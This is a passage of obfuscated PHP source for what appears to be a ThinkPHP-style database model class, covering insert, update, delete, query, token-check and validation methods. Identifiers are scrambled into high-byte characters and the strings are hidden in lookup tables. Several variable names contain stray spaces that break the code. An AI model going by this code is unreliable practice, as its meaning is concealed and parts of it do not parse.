$Ïâ‘Şñç[304], $Ïâ‘Şñç[305]), !0)) { $€Ğ¤¤»½ = isset($ù¿µŸœ[0]) ? $ù¿µŸœ[0] : $Ïâ‘Şñç[205]; $€Ğ¤¤»½ = $this->db->parseKey($€Ğ¤¤»½); return $this->getField(strtoupper($Ãâ–ù¦) . $Ïâ‘Şñç[306] . $€Ğ¤¤»½ . $Ïâ‘Şñç[307] . $Ãâ–ù¦, $Ïâ‘Şñç[301]); } elseif (strtolower(substr($Ãâ–ù¦, 0, 5)) == $Ïâ‘Şñç[308]) { $€Ğ¤¤»½ = think_parse_name(substr($Ãâ–ù¦, 5)); $ª¸Œ±ı½[$€Ğ¤¤»½] = $ù¿µŸœ[0]; return $this->where($ª¸Œ±ı½)->find(); } elseif (strtolower(substr($Ãâ–ù¦, 0, 10)) == $Ïâ‘Şñç[309]) { $­Å¼¬± = think_parse_name(substr($Ãâ–ù¦, 10)); $ª¸Œ±ı½[$­Å¼¬±] = $ù¿µŸœ[0]; return $this->where($ª¸Œ±ı½)->getField($ù¿µŸœ[1]); } elseif (isset($this->_scope[$Ãâ–ù¦])) { return $this->scope($Ãâ–ù¦, $ù¿µŸœ[0]); } elseif (method_exists($this, $Ãâ–ù¦)) { array_unshift($ù¿µŸœ, $Ãâ–ù¦); return call_user_func_array(array($this, $Ïâ‘Şñç[310]), $ù¿µŸœ); } else { return call_user_func_array(array(parent, $Ãâ–ù¦), $ù¿µŸœ); } } protected function call() { $ÎöæÓ™è =& $_SERVER[èùÙ¹Ïö]; $œ‹óíÕ = func_get_args(); $Ğˆ‚õˆ = array_shift($œ‹óíÕ); $˜Ë©‹€ = $Ğˆ‚õˆ; if (is_array($Ğˆ‚õˆ)) { $˜Ë©‹€ = $Ğˆ‚õˆ[1]; $Ğˆ‚õˆ = $Ğˆ‚õˆ[0]; } $şÎò•¨¼ = count($œ‹óíÕ) - 1; if (isset($œ‹óíÕ[$şÎò•¨¼]) && $œ‹óíÕ[$şÎò•¨¼] === $Ğˆ‚õˆ) { think_exception(__CLASS__ . $ÎöæÓ™è[4] . $Ğˆ‚õˆ . think_lang($ÎöæÓ™è[311])); return; } $œ‹óíÕ[] = $Ğˆ‚õˆ; if (method_exists($this, $ÎöæÓ™è[312])) { $ÎÁ»ıò = call_user_func_array(array($this, $ÎöæÓ™è[313]), array($˜Ë©‹€, $œ‹óíÕ)); if (!is_null($ÎÁ»ıò) && $ÎÁ»ıò !== !1) { return $ÎÁ»ıò; } } $†úø–ç = call_user_func_array(array($this, $Ğˆ‚õˆ), $œ‹óíÕ); if (method_exists($this, $ÎöæÓ™è[314])) { $ÎÁ»ıò = call_user_func_array(array($this, $ÎöæÓ™è[315]), array($˜Ë©‹€, $œ‹óíÕ, $†úø–ç)); if ($ÎÁ»ıò) { return $ÎÁ»ıò; } } return $†úø–ç; } protected function _initialize() { } protected function _facade($ÉÓ†ÉØÙ) { $ÜÊ†ùÃ¼ =& $_SERVER[èùÙ¹Ïö]; if (!empty($this->fields)) { foreach ($ÉÓ†ÉØÙ as $‹®ŸÄ¦ú => $€¯Ûú€ˆ) { if (is_array($this->fields) && !in_array($‹®ŸÄ¦ú, $this->fields, !0)) { unset($ÉÓ†ÉØÙ[$‹®ŸÄ¦ú]); } elseif (is_scalar($€¯Ûú€ˆ)) { $this->_parseType($ÉÓ†ÉØÙ, $‹®ŸÄ¦ú); } } } if (!empty($this->options[$ÜÊ†ùÃ¼[316]])) { $ÉÓ†ÉØÙ = array_map($this->options[$ÜÊ†ùÃ¼[316]], $ÉÓ†ÉØÙ); unset($this->options[$ÜÊ†ùÃ¼[316]]); } $this->_beforeWrite($ÉÓ†ÉØÙ); return $ÉÓ†ÉØÙ; } protected function _beforeWrite(&$‰¦ıÄ¨£) { } public function add($¦ú´Áá§ = '', $ûı×ãçº = array(), $ğå¯Îµ‘ = false) { if (empty($¦ú´Áá§)) { if (!empty($this->data)) { $¦ú´Áá§ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[èùÙ¹Ïö][317]); return !1; } } $ûı×ãçº = $this->_parseOptions($ûı×ãçº); $¦ú´Áá§ = $this->_facade($¦ú´Áá§); if (!1 === $this->_beforeInsert($¦ú´Áá§, $ûı×ãçº)) { return !1; } $áÏ“»ö = $this->db->insert($¦ú´Áá§, $ûı×ãçº, $ğå¯Îµ‘); if (!1 !== $áÏ“»ö) { $í¹Â¨¾õ = $this->getLastInsID(); if ($í¹Â¨¾õ) { $¦ú´Áá§[$this->getPk()] = $í¹Â¨¾õ; $this->_after_insert($¦ú´Áá§, $ûı×ãçº); return $í¹Â¨¾õ; } $this->_after_insert($¦ú´Áá§, $ûı×ãçº); } return $áÏ“»ö; } protected function _beforeInsert(&$ëş·Ü…, $¿¼òÂ) { } protected function _after_insert($ëµğıÂ, $ÈİĞĞñı) { } public function addAll($•Ÿ¼ãƒÂ, $ÔÔ‡ñÛó = array(), $ÖÉ®¼¯‹ = false) { $£µœñÌ =& $_SERVER[èùÙ¹Ïö]; if (empty($•Ÿ¼ãƒÂ)) { $this->error = think_lang($£µœñÌ[317]); return !1; } $ÔÔ‡ñÛó = $this->_parseOptions($ÔÔ‡ñÛó); foreach ($•Ÿ¼ãƒÂ as $ä™„ŠôÏ => $è„ôª¤á) { $•Ÿ¼ãƒÂ[$ä™„ŠôÏ] = $this->_facade($è„ôª¤á); } if (method_exists($this->db, $£µœñÌ[318])) { $È¡‹ü = $this->db->insertAll($•Ÿ¼ãƒÂ, $ÔÔ‡ñÛó, $ÖÉ®¼¯‹); } else { $this->startTrans(); foreach ($•Ÿ¼ãƒÂ as $ä™„ŠôÏ => $è„ôª¤á) { $È¡‹ü = $this->db->insert($è„ôª¤á, $ÔÔ‡ñÛó, $ÖÉ®¼¯‹); } $this->commit(); } if (!1 !== $È¡‹ü) { $øªÆŠÏ = $this->getLastInsID(); if ($øªÆŠÏ) { return $øªÆŠÏ; } } return $È¡‹ü; } public function selectAdd($ü’†º£ = '', $×Èê¥‚½ = '', $”ãìú•Á = array()) { $íÂ´ÆÈÄ =& $_SERVER[èùÙ¹Ïö]; $”ãìú•Á = $this->_parseOptions($”ãìú•Á); if (!1 === ($ïÀò™Î± = $this->db->selectInsert($ü’†º£ ? $ü’†º£ : $”ãìú•Á[$íÂ´ÆÈÄ[319]], $×Èê¥‚½ ? $×Èê¥‚½ : $this->getTableName(), $”ãìú•Á))) { $this->error = think_lang($íÂ´ÆÈÄ[320]); return !1; } else { return $ïÀò™Î±; } } public function save($®ˆÊÆ±² = '', $Œ°Ú…úÄ = array()) { $ÈõÍÉÓª =& $_SERVER[èùÙ¹Ïö]; if (empty($®ˆÊÆ±²)) { if (!empty($this->data)) { $®ˆÊÆ±² = $this->data; $this->data = array(); } else { $this->error = think_lang($ÈõÍÉÓª[317]); return !1; } } $®ˆÊÆ±² = $this->_facade($®ˆÊÆ±²); $Œ°Ú…úÄ = $this->_parseOptions($Œ°Ú…úÄ); $Š¹ã¹şŞ = $this->getPk(); if (!isset($Œ°Ú…úÄ[$ÈõÍÉÓª[321]])) { if (isset($®ˆÊÆ±²[$Š¹ã¹şŞ])) { $ëš«‚÷÷[$Š¹ã¹şŞ] = $®ˆÊÆ±²[$Š¹ã¹şŞ]; $Œ°Ú…úÄ[$ÈõÍÉÓª[321]] = $ëš«‚÷÷; unset($®ˆÊÆ±²[$Š¹ã¹şŞ]); } else { $this->error = think_lang($ÈõÍÉÓª[320]); return !1; } } if (is_array($Œ°Ú…úÄ[$ÈõÍÉÓª[321]]) && isset($Œ°Ú…úÄ[$ÈõÍÉÓª[321]][$Š¹ã¹şŞ])) { $½¹¶•Ü = $Œ°Ú…úÄ[$ÈõÍÉÓª[321]][$Š¹ã¹şŞ]; } if (!1 === $this->_beforeUpdate($®ˆÊÆ±², $Œ°Ú…úÄ)) { return !1; } $õ¨ô÷¢ = $this->db->update($®ˆÊÆ±², $Œ°Ú…úÄ); if (!1 !== $õ¨ô÷¢) { if (isset($½¹¶•Ü)) { $®ˆÊÆ±²[$Š¹ã¹şŞ] = $½¹¶•Ü; } $this->_afterUpdate($®ˆÊÆ±², $Œ°Ú…úÄ); } return $õ¨ô÷¢; } protected function _beforeUpdate(&$Àûâ¢§, $èö•˜ôØ) { } protected function _afterUpdate($äÇ¸î, $†ÙæÛŒ) { } public function delete($š²–³´ = array()) { $Ş©¦¥™ =& $_SERVER[èùÙ¹Ïö]; if (empty($š²–³´) && empty($this->options[$Ş©¦¥™[321]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¡´£¹¥ = $this->getPk(); if (is_numeric($š²–³´) || is_string($š²–³´)) { if (strpos($š²–³´, $Ş©¦¥™[50])) { $îÅƒ·õà[$¡´£¹¥] = array($Ş©¦¥™[322], $š²–³´); } else { $îÅƒ·õà[$¡´£¹¥] = $š²–³´; } $this->options[$Ş©¦¥™[321]] = $îÅƒ·õà; } $š²–³´ = $this->_parseOptions(); if (is_array($š²–³´[$Ş©¦¥™[321]]) && isset($š²–³´[$Ş©¦¥™[321]][$¡´£¹¥])) { $İÔÕøÕİ = $š²–³´[$Ş©¦¥™[321]][$¡´£¹¥]; } $œíÖì = $this->db->delete($š²–³´); if (!1 !== $œíÖì) { $Ş×óƒù = array(); if (isset($İÔÕøÕİ)) { $Ş×óƒù[$¡´£¹¥] = $İÔÕøÕİ; } $this->_after_delete($Ş×óƒù, $š²–³´); } return $œíÖì; } protected function _after_delete($Õ®ïÉ¶Õ, $ô½šßÒÌ) { } public function select($Ñ¹ˆÂöª = array()) { $«Á—¥¸ó =& $_SERVER[èùÙ¹Ïö]; if (is_string($Ñ¹ˆÂöª) || is_numeric($Ñ¹ˆÂöª)) { $ÇöÄ·ÜØ = $this->getPk(); if (strpos($Ñ¹ˆÂöª, $«Á—¥¸ó[50])) { $éöƒÎ®õ[$ÇöÄ·ÜØ] = array($«Á—¥¸ó[322], $Ñ¹ˆÂöª); } else { $éöƒÎ®õ[$ÇöÄ·ÜØ] = $Ñ¹ˆÂöª; } $this->options[$«Á—¥¸ó[321]] = $éöƒÎ®õ; } elseif (!1 === $Ñ¹ˆÂöª) { $Ñ¹ˆÂöª = $this->_parseOptions(); return $«Á—¥¸ó[323] . $this->db->buildSelectSql($Ñ¹ˆÂöª) . $«Á—¥¸ó[324]; } $Ñ¹ˆÂöª = $this->_parseOptions(); $ìÎ¹Ÿßç = $this->db->select($Ñ¹ˆÂöª); if (!1 === $ìÎ¹Ÿßç) { return !1; } if (empty($ìÎ¹Ÿßç)) { return null; } $this->_afterSelect($ìÎ¹Ÿßç, $Ñ¹ˆÂöª); return $ìÎ¹Ÿßç; } protected function _afterSelect(&$ãÛ”é•, $Ë…»ó„) { } public function buildSql($ ÂüÇÔ¡ = array()) { $¸öçÚÖÉ =& $_SERVER[èùÙ¹Ïö]; $ ÂüÇÔ¡ = $this->_parseOptions($ ÂüÇÔ¡); return $¸öçÚÖÉ[323] . $this->db->buildSelectSql($ ÂüÇÔ¡) . $¸öçÚÖÉ[324]; } public function optionsValue($³§Î––¾ = null) { if (is_null($³§Î––¾)) { return $this->options; } elseif (is_array($³§Î––¾)) { $this->options = array_merge($this->options, $³§Î––¾); } } protected function _parseOptions($ú®¨ÆÕ = array()) { $è¤èØó– =& $_SERVER[èùÙ¹Ïö]; if (is_array($ú®¨ÆÕ)) { $ú®¨ÆÕ = array_merge($this->options, $ú®¨ÆÕ); } $this->options = array(); if (!isset($ú®¨ÆÕ[$è¤èØó–[325]])) { $ú®¨ÆÕ[$è¤èØó–[325]] = $this->getTableName(); $¿ÍÁì« = $this->fields; } else { $¿ÍÁì« = $this->getDbFields(); } if (!empty($ú®¨ÆÕ[$è¤èØó–[326]])) { $ú®¨ÆÕ[$è¤èØó–[325]] .= $è¤èØó–[53] . $ú®¨ÆÕ[$è¤èØó–[326]]; } $ú®¨ÆÕ[$è¤èØó–[327]] = $this->name; if (isset($ú®¨ÆÕ[$è¤èØó–[321]]) && is_array($ú®¨ÆÕ[$è¤èØó–[321]]) && !empty($¿ÍÁì«) && !isset($ú®¨ÆÕ[$è¤èØó–[328]]) && !isset($ú®¨ÆÕ[$è¤èØó–[325]])) { foreach ($ú®¨ÆÕ[$è¤èØó–[321]] as $ú—æŠüÑ => $ô›•¨ç±) { $ú—æŠüÑ = trim($ú—æŠüÑ); if (in_array($ú—æŠüÑ, $¿ÍÁì«, !0)) { if (is_scalar($ô›•¨ç±)) { $this->_parseType($ú®¨ÆÕ[$è¤èØó–[321]], $ú—æŠüÑ); } } elseif (!is_numeric($ú—æŠüÑ) && $è¤èØó–[11] != substr($ú—æŠüÑ, 0, 1) && !1 === strpos($ú—æŠüÑ, $è¤èØó–[10]) && !1 === strpos($ú—æŠüÑ, $è¤èØó–[306]) && !1 === strpos($ú—æŠüÑ, $è¤èØó–[329]) && !1 === strpos($ú—æŠüÑ, $è¤èØó–[330])) { unset($ú®¨ÆÕ[$è¤èØó–[321]][$ú—æŠüÑ]); } } } $this->_options_filter($ú®¨ÆÕ); return $ú®¨ÆÕ; } protected function _options_filter(&$§§ñòÓÊ) { } protected function _parseType(&$¡³Ü®å, $¾„ŠÂÓã) { $½÷Ôê…¯ =& $_SERVER[èùÙ¹Ïö]; if (empty($this->options[$½÷Ôê…¯[331]][$½÷Ôê…¯[4] . $¾„ŠÂÓã])) { $Å¤…ƒà = strtolower($this->fields[$½÷Ôê…¯[298]][$¾„ŠÂÓã]); if (!1 !== strpos($Å¤…ƒà, $½÷Ôê…¯[332])) { } elseif (!1 === strpos($Å¤…ƒà, $½÷Ôê…¯[333]) && !1 !== strpos($Å¤…ƒà, $½÷Ôê…¯[334])) { $¡³Ü®å[$¾„ŠÂÓã] = intval($¡³Ü®å[$¾„ŠÂÓã]); } elseif (!1 !== strpos($Å¤…ƒà, $½÷Ôê…¯[335]) || !1 !== strpos($Å¤…ƒà, $½÷Ôê…¯[336])) { $¡³Ü®å[$¾„ŠÂÓã] = floatval($¡³Ü®å[$¾„ŠÂÓã]); } elseif (!1 !== strpos($Å¤…ƒà, $½÷Ôê…¯[337])) { $¡³Ü®å[$¾„ŠÂÓã] = (bool) $¡³Ü®å[$¾„ŠÂÓã]; } } } public function find($ÎûÛ™½¯ = array()) { $•—ã×ˆÉ =& $_SERVER[èùÙ¹Ïö]; if (is_numeric($ÎûÛ™½¯) || is_string($ÎûÛ™½¯)) { $œ†ñÃæ[$this->getPk()] = intval($ÎûÛ™½¯); $this->options[$•—ã×ˆÉ[321]] = $œ†ñÃæ; } $this->options[$•—ã×ˆÉ[338]] = 1; $ÎûÛ™½¯ = $this->_parseOptions(); $½‡¯­§Ò = $this->db->select($ÎûÛ™½¯); if (!1 === $½‡¯­§Ò) { return !1; } if (empty($½‡¯­§Ò)) { return null; } $this->data = $½‡¯­§Ò[0]; $this->_afterFind($this->data, $ÎûÛ™½¯); if (!empty($this->options[$•—ã×ˆÉ[339]])) { return $this->returnResult($this->data, $this->options[$•—ã×ˆÉ[339]]); } return $this->data; } protected function _afterFind(&$†²ñÎˆâ, $šéˆûß) { } protected function returnResult($®¾¢şÌ, $¨´ÃÑ´ü = '') { $¥ñ‹Çë =& $_SERVER[èùÙ¹Ïö]; if ($¨´ÃÑ´ü) { if (is_callable($¨´ÃÑ´ü)) { return call_user_func($¨´ÃÑ´ü, $®¾¢şÌ); } switch (strtolower($¨´ÃÑ´ü)) { case $¥ñ‹Çë[340]: return json_encode($®¾¢şÌ); case $¥ñ‹Çë[341]: return xml_encode($®¾¢şÌ); } } return $®¾¢şÌ; } public function parseFieldsMap($ƒşâòÒõ, $ÖÔ¼ó½ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $˜Ğ€ÕŠƒ => $ÇöòÒò) { if ($ÖÔ¼ó½ == 1) { if (isset($ƒşâòÒõ[$ÇöòÒò])) { $ƒşâòÒõ[$˜Ğ€ÕŠƒ] = $ƒşâòÒõ[$ÇöòÒò]; unset($ƒşâòÒõ[$ÇöòÒò]); } } else { if (isset($ƒşâòÒõ[$˜Ğ€ÕŠƒ])) { $ƒşâòÒõ[$ÇöòÒò] = $ƒşâòÒõ[$˜Ğ€ÕŠƒ]; unset($ƒşâòÒõ[$˜Ğ€ÕŠƒ]); } } } } return $ƒşâòÒõ; } public function setField($İ¾ıš–Ü, $ €ÏÂß = '') { if (is_array($İ¾ıš–Ü)) { $æ¨¿¾Ğù = $İ¾ıš–Ü; } else { $æ¨¿¾Ğù[$İ¾ıš–Ü] = $ €ÏÂß; } return $this->save($æ¨¿¾Ğù); } public function setAdd($Ù¨˜¿¾, $×ø·­«ò = 1) { $•‹ „× =& $_SERVER[èùÙ¹Ïö]; $Ó®úÈ¿ = $Ù¨˜¿¾ . $•‹ „×[342] . $×ø·­«ò; if ($×ø·­«ò < 0) { $Ó®úÈ¿ = $Ù¨˜¿¾ . $×ø·­«ò; } return $this->setField($Ù¨˜¿¾, array($•‹ „×[343], $Ó®úÈ¿)); } public function getField($¸íî¢«Ë, $Œ½Êìö— = null) { $ê§—»¹ =& $_SERVER[èùÙ¹Ïö]; $äğİ€Ë[$ê§—»¹[319]] = $¸íî¢«Ë; $äğİ€Ë = $this->_parseOptions($äğİ€Ë); $¸íî¢«Ë = trim($¸íî¢«Ë); if (strpos($¸íî¢«Ë, $ê§—»¹[50])) { if (!isset($äğİ€Ë[$ê§—»¹[338]])) { $äğİ€Ë[$ê§—»¹[338]] = is_numeric($Œ½Êìö—) ? $Œ½Êìö— : $ê§—»¹[12]; } $üÎëîš = $this->db->select($äğİ€Ë); if (!empty($üÎëîš)) { $éÃ‘–öŞ = explode($ê§—»¹[50], $¸íî¢«Ë); $¸íî¢«Ë = array_keys($üÎëîš[0]); $ÖïÑƒµò = array_shift($¸íî¢«Ë); $áÊµ÷‚Ä = array_shift($¸íî¢«Ë); $ƒªİú‘œ = array(); $‹¸Ü”´¢ = count($éÃ‘–öŞ); foreach ($üÎëîš as $›•¶ÛÒ) { $ÛèØãÜ± = $›•¶ÛÒ[$ÖïÑƒµò]; if (2 == $‹¸Ü”´¢) { $ƒªİú‘œ[$ÛèØãÜ±] = $›•¶ÛÒ[$áÊµ÷‚Ä]; } else { $ƒªİú‘œ[$ÛèØãÜ±] = is_string($Œ½Êìö—) ? implode($Œ½Êìö—, $›•¶ÛÒ) : $›•¶ÛÒ; } } return $ƒªİú‘œ; } } else { if (!0 !== $Œ½Êìö—) { $äğİ€Ë[$ê§—»¹[338]] = is_numeric($Œ½Êìö—) ? $Œ½Êìö— : 1; } if ($Œ½Êìö— === $ê§—»¹[301]) { unset($äğİ€Ë[$ê§—»¹[338]]); } $›•¶ÛÒ = $this->db->select($äğİ€Ë); if (!empty($›•¶ÛÒ)) { if ($Œ½Êìö— === $ê§—»¹[301]) { return reset($›•¶ÛÒ[0]); } if (!0 !== $Œ½Êìö— && 1 == $äğİ€Ë[$ê§—»¹[338]]) { return reset($›•¶ÛÒ[0]); } foreach ($›•¶ÛÒ as $ŸºÕÒ Ó) { $ûë¬³¢—[] = $ŸºÕÒ Ó[$¸íî¢«Ë]; } return $ûë¬³¢—; } } return null; } public function create($Šò—ŞÀ = '', $šæ†ñ±° = '') { $¡ï™ü“á =& $_SERVER[èùÙ¹Ïö]; if (empty($Šò—ŞÀ)) { $Šò—ŞÀ = $_POST; } elseif (is_object($Šò—ŞÀ)) { $Šò—ŞÀ = get_object_vars($Šò—ŞÀ); } if (empty($Šò—ŞÀ) || !is_array($Šò—ŞÀ)) { $this->error = think_lang($¡ï™ü“á[317]); return !1; } $Šò—ŞÀ = $this->parseFieldsMap($Šò—ŞÀ, 0); $šæ†ñ±° = $šæ†ñ±° ? $šæ†ñ±° : (!empty($Šò—ŞÀ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¡ï™ü“á[319]])) { $ûŒ²È¶ï = $this->options[$¡ï™ü“á[319]]; unset($this->options[$¡ï™ü“á[319]]); } elseif ($šæ†ñ±° == THINK_MODEL_INSERT && isset($this->insertFields)) { $ûŒ²È¶ï = $this->insertFields; } elseif ($šæ†ñ±° == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ûŒ²È¶ï = $this->updateFields; } if (isset($ûŒ²È¶ï)) { if (is_string($ûŒ²È¶ï)) { $ûŒ²È¶ï = explode($¡ï™ü“á[50], $ûŒ²È¶ï); } if (think_config($¡ï™ü“á[344])) { $ûŒ²È¶ï[] = think_config($¡ï™ü“á[345]); } foreach ($Šò—ŞÀ as $«áŠ—çç => $À¾‹´ì—) { if (!in_array($«áŠ—çç, $ûŒ²È¶ï)) { unset($Šò—ŞÀ[$«áŠ—çç]); } } } if (!$this->autoValidation($Šò—ŞÀ, $šæ†ñ±°)) { return !1; } if (!$this->autoCheckToken($Šò—ŞÀ)) { $this->error = think_lang($¡ï™ü“á[346]); return !1; } if ($this->autoCheckFields) { $ûŒ²È¶ï = $this->getDbFields(); foreach ($Šò—ŞÀ as $«áŠ—çç => $À¾‹´ì—) { if (!in_array($«áŠ—çç, $ûŒ²È¶ï)) { unset($Šò—ŞÀ[$«áŠ—çç]); } elseif (MAGIC_QUOTES_GPC && is_string($À¾‹´ì—)) { $Šò—ŞÀ[$«áŠ—çç] = stripslashes($À¾‹´ì—); } } } $this->autoOperation($Šò—ŞÀ, $šæ†ñ±°); $this->data = $Šò—ŞÀ; return $Šò—ŞÀ; } public function autoCheckToken($Â§ËÜşÖ) { $§™‹Ûê• =& $_SERVER[èùÙ¹Ïö]; if (isset($this->options[$§™‹Ûê•[347]]) && !$this->options[$§™‹Ûê•[347]]) { return !0; } if (think_config($§™‹Ûê•[344])) { $Å§¦©å = think_config($§™‹Ûê•[345]); if (!isset($Â§ËÜşÖ[$Å§¦©å]) || Session::get($Å§¦©å)) { return !1; } list($’‹²œ†, $Îç¬Â†æ) = explode($§™‹Ûê•[11], $Â§ËÜşÖ[$Å§¦©å]); if ($Îç¬Â†æ && Session::get($Å§¦©å . $§™‹Ûê•[10] . $’‹²œ†) === $Îç¬Â†æ) { Session::remove($Å§¦©å . $§™‹Ûê•[10] . $’‹²œ†); return !0; } if (think_config($§™‹Ûê•[348])) { Session::remove($Å§¦©å . $§™‹Ûê•[10] . $’‹²œ†); } return !1; } return !0; } public function regex($õ§Ç˜±Á, $û¬ÓÔ¡) { $”ù¬£õ¯ =& $_SERVER[èùÙ¹Ïö]; $æ¥ˆ³¸ = array($”ù¬£õ¯[349] => $”ù¬£õ¯[350], $”ù¬£õ¯[351] => $”ù¬£õ¯[352], $”ù¬£õ¯[353] => $”ù¬£õ¯[354], $”ù¬£õ¯[355] => $”ù¬£õ¯[356], $”ù¬£õ¯[357] => $”ù¬£õ¯[358], $”ù¬£õ¯[359] => $”ù¬£õ¯[360], $”ù¬£õ¯[361] => $”ù¬£õ¯[362], $”ù¬£õ¯[336] => $”ù¬£õ¯[363], $”ù¬£õ¯[364] => $”ù¬£õ¯[365]); if (isset($æ¥ˆ³¸[strtolower($û¬ÓÔ¡)])) { $û¬ÓÔ¡ = $æ¥ˆ³¸[strtolower($û¬ÓÔ¡)]; } return preg_match($û¬ÓÔ¡, $õ§Ç˜±Á) === 1; } private function autoOperation(&$Áøçç…·, $ë¾ÁÌ¸Ô) { $äš‘ô‡ =& $_SERVER[èùÙ¹Ïö]; if (!empty($this->options[$äš‘ô‡[366]])) { $ÆïÕĞÙ­ = $this->options[$äš‘ô‡[366]]; unset($this->options[$äš‘ô‡[366]]); } elseif (!empty($this->_auto)) { $ÆïÕĞÙ­ = $this->_auto; } if (isset($ÆïÕĞÙ­)) { foreach ($ÆïÕĞÙ­ as $ã†ìú¥µ) { if (empty($ã†ìú¥µ[2])) { $ã†ìú¥µ[2] = THINK_MODEL_INSERT; } if ($ë¾ÁÌ¸Ô == $ã†ìú¥µ[2] || $ã†ìú¥µ[2] == THINK_MODEL_BOTH) { switch (trim($ã†ìú¥µ[3])) { case $äš‘ô‡[367]: case $äš‘ô‡[368]: $’»³á‚ê = isset($ã†ìú¥µ[4]) ? (array) $ã†ìú¥µ[4] : array(); if (isset($Áøçç…·[$ã†ìú¥µ[0]])) { array_unshift($’»³á‚ê, $Áøçç…·[$ã†ìú¥µ[0]]); } if ($äš‘ô‡[367] == $ã†ìú¥µ[3]) { $Áøçç…·[$ã†ìú¥µ[0]] = call_user_func_array($ã†ìú¥µ[1], $’»³á‚ê); } else { $Áøçç…·[$ã†ìú¥µ[0]] = call_user_func_array(array(&$this, $ã†ìú¥µ[1]), $’»³á‚ê); } break; case $äš‘ô‡[319]: $Áøçç…·[$ã†ìú¥µ[0]] = $Áøçç…·[$ã†ìú¥µ[1]]; break; case $äš‘ô‡[369]: if ($äš‘ô‡[12] === $Áøçç…·[$ã†ìú¥µ[0]]) { unset($Áøçç…·[$ã†ìú¥µ[0]]); } break; case $äš‘ô‡[370]: default: $Áøçç…·[$ã†ìú¥µ[0]] = $ã†ìú¥µ[1]; } if (!1 === $Áøçç…·[$ã†ìú¥µ[0]]) { unset($Áøçç…·[$ã†ìú¥µ[0]]); } } } } return $Áøçç…·; } protected function autoValidation($Ì‡³ƒ´†, $ÇÎ¾ğÈ…) { $øÌ™ÜÈ° =& $_SERVER[èùÙ¹Ïö]; if (!empty($this->options[$øÌ™ÜÈ°[371]])) { $ûØÒêäğ = $this->options[$øÌ™ÜÈ°[371]]; unset($this->options[$øÌ™ÜÈ°[371]]); } elseif (!empty($this->_validate)) { $ûØÒêäğ = $this->_validate; } if (isset($ûØÒêäğ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ûØÒêäğ as $ Òşªï€ => $ûšË–¢À) { if (empty($ûšË–¢À[5]) || $ûšË–¢À[5] == THINK_MODEL_BOTH || $ûšË–¢À[5] == $ÇÎ¾ğÈ…) { if (0 == strpos($ûšË–¢À[2], $øÌ™ÜÈ°[372]) && strpos($ûšË–¢À[2], $øÌ™ÜÈ°[373])) { $ûšË–¢À[2] = think_lang(substr($ûšË–¢À[2], 2, -1)); } $ûšË–¢À[3] = isset($ûšË–¢À[3]) ? $ûšË–¢À[3] : THINK_EXISTS_VALIDATE; $ûšË–¢À[4] = isset($ûšË–¢À[4]) ? $ûšË–¢À[4] : $øÌ™ÜÈ°[374]; switch ($ûšË–¢À[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ì‡³ƒ´†, $ûšË–¢À)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($øÌ™ÜÈ°[12] != trim($Ì‡³ƒ´†[$ûšË–¢À[0]])) { if (!1 === $this->_validationField($Ì‡³ƒ´†, $ûšË–¢À)) { return !1; } } break; default: if (isset($Ì‡³ƒ´†[$ûšË–¢À[0]])) { if (!1 === $this->_validationField($Ì‡³ƒ´†, $ûšË–¢À)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ã¢Ïã²ä, $Ü»Íô¬) { if (!1 === $this->_validationFieldItem($Ã¢Ïã²ä, $Ü»Íô¬)) { if ($this->patchValidate) { $this->error[$Ü»Íô¬[0]] = $Ü»Íô¬[2]; } else { $this->error = $Ü»Íô¬[2]; return !1; } } return; } protected function _validationFieldItem($úâ¢ÄßÀ, $ûØ›Æà) { $µÔéÉè =& $_SERVER[èùÙ¹Ïö]; switch (strtolower(trim($ûØ›Æà[4]))) { case $µÔéÉè[367]: case $µÔéÉè[368]: $ƒ˜¥ñÕ = isset($ûØ›Æà[6]) ? (array) $ûØ›Æà[6] : array(); if (is_string($ûØ›Æà[0]) && strpos($ûØ›Æà[0], $µÔéÉè[50])) { $ûØ›Æà[0] = explode($µÔéÉè[50], $ûØ›Æà[0]); } if (is_array($ûØ›Æà[0])) { foreach ($ûØ›Æà[0] as $—Ìî©¼ò) { $ñíÂ»™¦[$—Ìî©¼ò] = $úâ¢ÄßÀ[$—Ìî©¼ò]; } array_unshift($ƒ˜¥ñÕ, $ñíÂ»™¦); } else { array_unshift($ƒ˜¥ñÕ, $úâ¢ÄßÀ[$ûØ›Æà[0]]); } if ($µÔéÉè[367] == $ûØ›Æà[4]) { return call_user_func_array($ûØ›Æà[1], $ƒ˜¥ñÕ); } else { return call_user_func_array(array(&$this, $ûØ›Æà[1]), $ƒ˜¥ñÕ); } case $µÔéÉè[375]: return $úâ¢ÄßÀ[$ûØ›Æà[0]] == $úâ¢ÄßÀ[$ûØ›Æà[1]]; case $µÔéÉè[376]: if (is_string($ûØ›Æà[0]) && strpos($ûØ›Æà[0], $µÔéÉè[50])) { $ûØ›Æà[0] = explode($µÔéÉè[50], $ûØ›Æà[0]); } $“ñ¹‰°ƒ = array(); if (is_array($ûØ›Æà[0])) { foreach ($ûØ›Æà[0] as $—Ìî©¼ò) { $“ñ¹‰°ƒ[$—Ìî©¼ò] = $úâ¢ÄßÀ[$—Ìî©¼ò]; } } else { $“ñ¹‰°ƒ[$ûØ›Æà[0]] = $úâ¢ÄßÀ[$ûØ›Æà[0]]; } if (!empty($úâ¢ÄßÀ[$this->getPk()])) { $“ñ¹‰°ƒ[$this->getPk()] = array($µÔéÉè[377], $úâ¢ÄßÀ[$this->getPk()]); } if ($this->where($“ñ¹‰°ƒ)->find()) { return !1; } return !0; default: return $this->check($úâ¢ÄßÀ[$ûØ›Æà[0]], $ûØ›Æà[1], $ûØ›Æà[4]); } } public function check($é’ìÌùº, $‡àÖ“àŸ, $ÜÒá”½” = "\162\x65\147\x65\170") { $¬€çòşÔ =& $_SERVER[èùÙ¹Ïö]; $ÜÒá”½” = strtolower(trim($ÜÒá”½”)); switch ($ÜÒá”½”) { case $¬€çòşÔ[7]: case $¬€çòşÔ[378]: $¨šÂÏê€ = is_array($‡àÖ“àŸ) ? $‡àÖ“àŸ : 